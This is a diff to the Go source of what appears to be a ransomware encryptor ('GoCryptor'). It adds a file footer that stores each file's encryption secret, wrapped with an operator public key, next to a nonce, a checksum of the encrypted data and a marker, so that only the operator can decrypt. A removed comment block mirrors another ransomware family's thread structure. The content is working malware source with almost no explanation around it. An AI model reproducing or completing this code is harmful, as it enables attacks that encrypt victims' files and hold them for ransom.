@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/binary"
 	"fmt"
 	"hash/crc32"
 	"io/fs"
@@ -15,8 +16,14 @@ var OperatorPubKey = [32]byte{67, 78, 117, 70, 95, 48, 99, 15, 164, 175, 205, 17
 
 var SmallDataPubKey = [32]byte{228, 146, 2, 131, 232, 4, 66, 231, 5, 189, 21, 177, 122, 31, 28, 192, 228, 95, 74, 152, 57, 150, 237, 254, 201, 234, 47, 69, 189, 73, 9, 20}
 
-// TODO: Populate this
 type EncryptedFileFooter struct {
+	EncryptedSharedSecret [32]byte // encrypted by operator public key
+	SharedSecretPublicKey [32]byte
+	SharedSecretNonce     [24]byte
+	FilePublicKey         [32]byte
+	FileNonce             [24]byte
+	EncryptedFileChecksum uint32
+	FileMarker            uint32
 }
 
 // Curve25519 generating public key from private key
@@ -43,22 +50,23 @@ func generateSharedSecret(myPrivateKey [32]byte, theirPublicKey [32]byte) []byte
 	return sharedSecret[:]
 }
 
-// Curve25519 example
-// myPrivateKey := [32]byte{191, 145, 93, 226, 52, 69, 63, 94, 153, 130, 232, 193, 74, 144, 81, 137, 132, 134, 145, 160, 130, 210, 154, 23, 221, 139, 188, 40, 59, 38, 146, 143}
-// myPublicKey := generatePublicKey(myPrivateKey)
-// fmt.Println("My private key: ", myPrivateKey)
-// fmt.Println("My public key: ", myPublicKey)
+func curve25519Example() {
+	myPrivateKey := [32]byte{191, 145, 93, 226, 52, 69, 63, 94, 153, 130, 232, 193, 74, 144, 81, 137, 132, 134, 145, 160, 130, 210, 154, 23, 221, 139, 188, 40, 59, 38, 146, 143}
+	myPublicKey := generatePublicKey(myPrivateKey)
+	fmt.Println("My private key: ", myPrivateKey)
+	fmt.Println("My public key: ", myPublicKey)
 
-// theirPrivateKey := [32]byte{63, 25, 33, 73, 88, 56, 26, 249, 232, 213, 30, 122, 35, 253, 225, 48, 148, 173, 229, 241, 29, 141, 170, 31, 37, 16, 158, 227, 75, 34, 153, 228}
-// theirPublicKey := generatePublicKey(theirPrivateKey)
-// fmt.Println("Their private key: ", theirPrivateKey)
-// fmt.Println("Their public key: ", theirPublicKey)
+	theirPrivateKey := [32]byte{63, 25, 33, 73, 88, 56, 26, 249, 232, 213, 30, 122, 35, 253, 225, 48, 148, 173, 229, 241, 29, 141, 170, 31, 37, 16, 158, 227, 75, 34, 153, 228}
+	theirPublicKey := generatePublicKey(theirPrivateKey)
+	fmt.Println("Their private key: ", theirPrivateKey)
+	fmt.Println("Their public key: ", theirPublicKey)
 
-// sharedSecret1 := generateSharedSecret(theirPrivateKey, myPublicKey)
-// sharedSecret2 := generateSharedSecret(myPrivateKey, theirPublicKey)
+	sharedSecret1 := generateSharedSecret(theirPrivateKey, myPublicKey)
+	sharedSecret2 := generateSharedSecret(myPrivateKey, theirPublicKey)
 
-// fmt.Println("Shared secret 1: ", sharedSecret1)
-// fmt.Println("Shared secret 2: ", sharedSecret2)
+	fmt.Println("Shared secret 1: ", sharedSecret1)
+	fmt.Println("Shared secret 2: ", sharedSecret2)
+}
 
 // CRC32 generating checksum for victim ID
 func crc32Checksum(input []byte, polynomial uint32) uint32 {
@@ -82,13 +90,15 @@ func encryptFileFull(filePath string, fileInfo fs.FileInfo) {
 	copy(filePrivateKey[:], generateRandomBuffer(32))
 	filePublicKey := generatePublicKey(filePrivateKey)
 
+	fmt.Println("!!!!!!!!!!!!", GoCryptorConfig.campaignKey)
 	sharedSecret := generateSharedSecret(filePrivateKey, GoCryptorConfig.campaignKey)
 
-	fmt.Println("Public key: ", filePublicKey)
-	fmt.Println("Shared secret: ", sharedSecret)
+	fmt.Println("Private key: ", filePrivateKey)
+	fmt.Println("Public key: ", filePublicKey, len(filePublicKey))
+	fmt.Println("Shared secret: ", sharedSecret, len(sharedSecret))
 
 	fileNonce := generateRandomBuffer(24)
-	fmt.Println("Nonce: ", fileNonce)
+	fmt.Println("Nonce: ", fileNonce, len(fileNonce))
 
 	fileBuffer, _ := os.ReadFile(filePath)
 	fmt.Println("Buffer: ", len(fileBuffer))
@@ -99,32 +109,32 @@ func encryptFileFull(filePath string, fileInfo fs.FileInfo) {
 	defer file.Close()
 
 	file.Write(encryptedFileBytes)
-
+	fileFooter := encodeToBytes(populateFileFooter(sharedSecret, filePublicKey[:], fileNonce, crc32Checksum(encryptedFileBytes, 0xBEEFCAFE)))
+	fileFooterLength := make([]byte, 4)
+	binary.LittleEndian.PutUint32(fileFooterLength, uint32(len(fileFooter)))
+	fileFooter = append(fileFooter, fileFooterLength...)
+	file.Write(fileFooter)
 }
 
-// struct THREAD_STRUCT
-// {
-//   HANDLE HeapHandle;
-//   HANDLE IOCompletionPort;
-//   DWORD threadCount;
-//   LONG unused; // these fields are left unused for some reason.
-//   LONG unused2; // Or maybe I'm just blind lmao
-//   HANDLE fileHandle;
-//   DWORD fileName;
-//   LONG unused3;
-//   LONG lowerFileEncryptedSize;
-//   LONG higherFileEncryptedSize;
-//   BYTE CAMPAIGN_ENCRYPTED_PRIV_SYS_KEY[88];
-//   BYTE OPERATOR_ENCRYPTED_PRIV_SYS_KEY[88];
-//   BYTE filePublicKey[32];
-//   BYTE Salsa20Nonce[8];
-//   DWORD filePublicKeyCRC32Hash;
-//   DWORD encryptionType;
-//   DWORD SPSIZE;
-//   DWORD Salsa20XorStream;
-//   BYTE Salsa20Key[64];
-//   DWORD threadCurrentState;
-//   DWORD threadNextState;
-//   DWORD fileBufferReadLength;
-//   DWORD fileDataBuffer;
-// };
+func populateFileFooter(sharedSecret []byte, filePublicKey []byte, fileNonce []byte, encryptedFileChecksum uint32) EncryptedFileFooter {
+	fileFooter := EncryptedFileFooter{}
+	fileFooter.FilePublicKey = [32]byte{}
+	copy(fileFooter.FilePublicKey[:], filePublicKey) // Potential overflow
+	fileFooter.FileNonce = [24]byte{}
+	copy(fileFooter.FileNonce[:], fileNonce) // Potential overflow
+	fileFooter.EncryptedFileChecksum = encryptedFileChecksum
+
+	var privateKey [32]byte
+	copy(privateKey[:], generateRandomBuffer(32))
+	publicKey := generatePublicKey(privateKey)
+	fileFooter.SharedSecretPublicKey = publicKey
+	newSharedSecret := generateSharedSecret(privateKey, OperatorPubKey)
+	nonce := generateRandomBuffer(24)
+	encryptedSharedSecret, _ := chacha20Encryptor(sharedSecret[:], newSharedSecret, nonce)
+	fileFooter.EncryptedSharedSecret = [32]byte{}
+	copy(fileFooter.EncryptedSharedSecret[:], encryptedSharedSecret)
+	fileFooter.SharedSecretNonce = [24]byte{}
+	copy(fileFooter.SharedSecretNonce[:], nonce)
+	fileFooter.FileMarker = 0xCAFEDEAD
+	return fileFooter
+}
